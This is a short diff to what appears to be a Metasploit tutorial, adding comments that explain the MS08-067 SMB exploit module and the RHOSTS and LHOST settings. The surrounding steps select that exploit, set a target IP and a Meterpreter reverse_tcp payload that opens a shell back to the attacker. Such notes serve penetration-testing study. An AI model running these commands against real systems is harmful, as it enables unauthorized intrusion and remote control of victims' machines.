@@ -18,7 +18,8 @@ Linux download command:
     - search exploit windows
 
   # 3) Select an Exploit
-    - use exploit/windows/smb/ms08_067_netapi
+    - use exploit/windows/smb/ms08_067_netapi # This is just an example of an exploit
+    - info exploit/windows/smb/ms08_067_netapi # Gets info about the exploit
 
   # 4) Show Available Options
     - show options
@@ -26,7 +27,8 @@ Linux download command:
   # 5) Set Target Parameters
     - set RHOSTS 192.168.1.100
     - set LHOST 192.168.1.50
-
+  RHOSTS: Remote Hosts, the target machine.
+  LHOST: Local Host, your machine you are attacking from.
   # 6) Set a Payload
     - set PAYLOAD windows/meterpreter/reverse_tcp
 
